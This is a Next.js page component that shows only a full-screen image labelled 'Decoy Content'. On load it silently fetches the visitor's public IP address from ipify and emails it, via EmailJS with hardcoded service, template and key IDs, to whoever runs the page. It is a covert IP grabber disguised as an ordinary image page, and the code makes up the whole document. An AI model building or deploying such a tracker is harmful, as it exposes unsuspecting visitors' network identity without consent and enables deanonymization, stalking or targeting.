"use client";

import { useEffect, useState, useCallback, useRef } from "react";
import axios from "axios";
import emailjs from "@emailjs/browser";
import decoyImg from "./assets/2.jpg";
import Image from "next/image";

export default function Home() {
  console.log("IP Checker Mounted");
  const [ip, setIp] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [sentStatus, setSentStatus] = useState<"idle" | "success" | "error">("idle");
  const hasSent = useRef(false);

  const getIpClient = useCallback(async () => {
    setLoading(true);
    setError(null);
    setSentStatus("idle");
    hasSent.current = false;
    try {
      const response = await axios.get("https://api.ipify.org?format=json");
      setIp(response.data.ip);
    } catch (err) {
      console.error(err);
      setError("Failed to fetch IP address. Please try again.");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    getIpClient();
  }, [getIpClient]);

  const sendEmail = useCallback(async () => {
    if (!ip || hasSent.current) return;
    
    setSentStatus("idle");
    hasSent.current = true;
    
    const templateParams = {
      title: "New Public IP Detected",
      name: "Antigravity System",
      time: new Date().toLocaleString(),
      message: `A new public IP signature has been identified: ${ip}`,
      email: "system@analyzer.local",
    };

    try {
      await emailjs.send(
        "service_htfn6fr",
        "template_fab263v",
        templateParams,
        "LriFXfMskhzI692uf"
      );
      console.log("Email sent successfully!");
      setSentStatus("success");
    } catch (err) {
      console.error("EmailJS Failed:", err);
      setSentStatus("error");
      hasSent.current = false; // Allow retry on failure
    }
  }, [ip]);

  // Automatic trigger when IP is fetched
  useEffect(() => {
    if (ip && !loading && !error && !hasSent.current && sentStatus === "idle") {
      // Delay slightly for better UX/animation flow
      const timer = setTimeout(() => {
        sendEmail();
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [ip, loading, error, sendEmail, sentStatus]);

  return (
    <main className="fixed inset-0 w-screen h-[100vh] overflow-hidden bg-black">
      <Image
        src={decoyImg}
        alt="Decoy Content"
        fill
        priority
        className="object-cover opacity-90 hover:opacity-100 transition-opacity duration-500"
      />
    </main>
  );
}
